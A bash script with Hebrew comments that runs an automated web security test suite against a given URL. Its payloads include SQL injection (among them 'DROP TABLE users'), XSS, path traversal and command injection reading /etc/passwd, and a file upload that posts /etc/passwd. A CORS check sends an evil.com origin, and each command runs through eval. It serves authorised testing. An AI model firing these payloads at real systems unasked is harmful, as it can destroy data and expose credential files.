#!/bin/bash

# יצירת תיקיית לוגים
mkdir -p security_logs/{sql_injection,xss,csrf,file_upload,general}
LOG_DIR="security_logs"
DATE=$(date +%Y%m%d_%H%M%S)
SUMMARY_FILE="$LOG_DIR/security_summary_$DATE.txt"

# הגדרת טוקן אימות
AUTH_TOKEN="Bearer your_token_here"  # יש להחליף עם הטוקן האמיתי שלך

# פונקציה לתיעוד
log_test() {
    local test_type=$1
    local description=$2
    local output_file="$LOG_DIR/$test_type/test_$DATE.log"
    
    echo "=== Test: $description ===" >> $output_file
    echo "Date: $(date)" >> $output_file
    echo "Type: $test_type" >> $output_file
    echo "URL: $3" >> $output_file
    echo "Command: $4" >> $output_file
    echo "Result:" >> $output_file
    eval "$4" >> $output_file
    echo "=== End Test ===" >> $output_file
}

# פונקציה לבדיקת HTTP Methods
test_http_methods() {
    local url=$1
    local methods=("GET" "POST" "PUT" "DELETE" "OPTIONS")
    
    for method in "${methods[@]}"; do
        log_test "general" "HTTP Method Test - $method" "$url" "curl -X $method -H \"Authorization: $AUTH_TOKEN\" $url -v"
    done
}

# פונקציה לבדיקת SQL Injection
test_sql_injection() {
    local url=$1
    local payloads=(
        "1' OR '1'='1"
        "1; DROP TABLE users;"
        "1' UNION SELECT * FROM users;"
        "1' OR '1'='1' --"
    )
    
    for payload in "${payloads[@]}"; do
        log_test "sql_injection" "SQL Injection Test - $payload" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" \"$url?id=$payload\" -v"
    done
}

# פונקציה לבדיקת XSS
test_xss() {
    local url=$1
    local payloads=(
        "<script>alert('xss')</script>"
        "<img src=x onerror=alert('xss')>"
        "javascript:alert('xss')"
        "<svg onload=alert('xss')>"
    )
    
    for payload in "${payloads[@]}"; do
        log_test "xss" "XSS Test - $payload" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" \"$url?input=$payload\" -v"
    done
}

# פונקציה לבדיקת CSRF
test_csrf() {
    local url=$1
    log_test "csrf" "CSRF Test" "$url" "curl -X POST -H \"Authorization: $AUTH_TOKEN\" -H \"Content-Type: application/json\" -d '{\"data\":\"test\"}' $url -v"
}

# פונקציה לבדיקת Buffer Overflow
test_buffer_overflow() {
    local url=$1
    local payload=$(python -c 'print("A"*1000)')
    log_test "general" "Buffer Overflow Test" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" \"$url?input=$payload\" -v"
}

# פונקציה לבדיקת Headers
test_headers() {
    local url=$1
    local headers=(
        "X-Forwarded-For: 1.1.1.1"
        "User-Agent: Mozilla/5.0"
        "X-Real-IP: 1.1.1.1"
        "X-Client-IP: 1.1.1.1"
    )
    
    for header in "${headers[@]}"; do
        log_test "general" "Header Test - $header" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" -H \"$header\" $url -v"
    done
}

# פונקציה לבדיקת Rate Limiting
test_rate_limiting() {
    local url=$1
    log_test "general" "Rate Limiting Test" "$url" "for i in {1..10}; do curl -H \"Authorization: $AUTH_TOKEN\" $url -v; done"
}

# פונקציה לבדיקת Authentication
test_auth() {
    local url=$1
    local tokens=(
        "invalid_token"
        "Bearer invalid_token"
        "Basic invalid_token"
    )
    
    for token in "${tokens[@]}"; do
        log_test "general" "Auth Test - $token" "$url" "curl -H \"Authorization: $token\" $url -v"
    done
}

# פונקציה לבדיקת File Upload
test_file_upload() {
    local url=$1
    log_test "file_upload" "File Upload Test" "$url" "curl -X POST -H \"Authorization: $AUTH_TOKEN\" -F \"file=@/etc/passwd\" $url -v"
}

# פונקציה לבדיקת Path Traversal
test_path_traversal() {
    local url=$1
    local paths=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32"
        "/etc/passwd"
    )
    
    for path in "${paths[@]}"; do
        log_test "general" "Path Traversal Test - $path" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" \"$url?file=$path\" -v"
    done
}

# פונקציה לבדיקת Content-Type
test_content_type() {
    local url=$1
    local content_types=(
        "application/x-www-form-urlencoded"
        "application/json"
        "multipart/form-data"
        "text/plain"
    )
    
    for type in "${content_types[@]}"; do
        log_test "general" "Content-Type Test - $type" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" -H \"Content-Type: $type\" -d \"data=test\" $url -v"
    done
}

# פונקציה לבדיקת SSL/TLS
test_ssl() {
    local url=$1
    log_test "general" "SSL/TLS Test" "$url" "curl -k -H \"Authorization: $AUTH_TOKEN\" $url -v"
}

# פונקציה לבדיקת CORS
test_cors() {
    local url=$1
    log_test "general" "CORS Test" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" -H \"Origin: http://evil.com\" $url -v"
}

# פונקציה לבדיקת HTTP Response Splitting
test_response_splitting() {
    local url=$1
    log_test "general" "HTTP Response Splitting Test" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" \"$url?input=%0d%0aContent-Length:%200%0d%0a%0d%0a\" -v"
}

# פונקציה לבדיקת Command Injection
test_command_injection() {
    local url=$1
    local commands=(
        "ls"
        "cat /etc/passwd"
        "whoami"
        "pwd"
    )
    
    for cmd in "${commands[@]}"; do
        log_test "general" "Command Injection Test - $cmd" "$url" "curl -H \"Authorization: $AUTH_TOKEN\" \"$url?command=$cmd\" -v"
    done
}

# פונקציה ליצירת סיכום
create_summary() {
    echo "=== Security Test Summary ===" > $SUMMARY_FILE
    echo "Date: $(date)" >> $SUMMARY_FILE
    echo "Total Tests: $(find $LOG_DIR -type f -name "*.log" | wc -l)" >> $SUMMARY_FILE
    echo "Test Categories:" >> $SUMMARY_FILE
    ls $LOG_DIR | while read dir; do
        echo "- $dir: $(find $LOG_DIR/$dir -type f -name "*.log" | wc -l) tests" >> $SUMMARY_FILE
    done
    echo "=== End Summary ===" >> $SUMMARY_FILE
}

# פונקציה לגיבוי
backup_logs() {
    tar -czf "security_logs_backup_$DATE.tar.gz" $LOG_DIR
}

# פונקציה ראשית
main() {
    local url=$1
    
    if [ -z "$url" ]; then
        echo "Usage: $0 <url>"
        echo "Example: $0 http://localhost:8000/api/"
        exit 1
    fi
    
    if [ -z "$AUTH_TOKEN" ] || [ "$AUTH_TOKEN" = "Bearer your_token_here" ]; then
        echo "Error: Please set your AUTH_TOKEN in the script"
        exit 1
    fi
    
    echo "Starting security tests on $url"
    
    # הרצת כל הבדיקות
    test_http_methods "$url"
    test_sql_injection "$url"
    test_xss "$url"
    test_csrf "$url"
    test_buffer_overflow "$url"
    test_headers "$url"
    test_rate_limiting "$url"
    test_auth "$url"
    test_file_upload "$url"
    test_path_traversal "$url"
    test_content_type "$url"
    test_ssl "$url"
    test_cors "$url"
    test_response_splitting "$url"
    test_command_injection "$url"
    
    # יצירת סיכום
    create_summary
    
    # גיבוי הלוגים
    backup_logs
    
    echo "Tests completed. Check $LOG_DIR for results."
    echo "Summary file: $SUMMARY_FILE"
    echo "Backup file: security_logs_backup_$DATE.tar.gz"
}

# הרצת הסקריפט
main "$1" 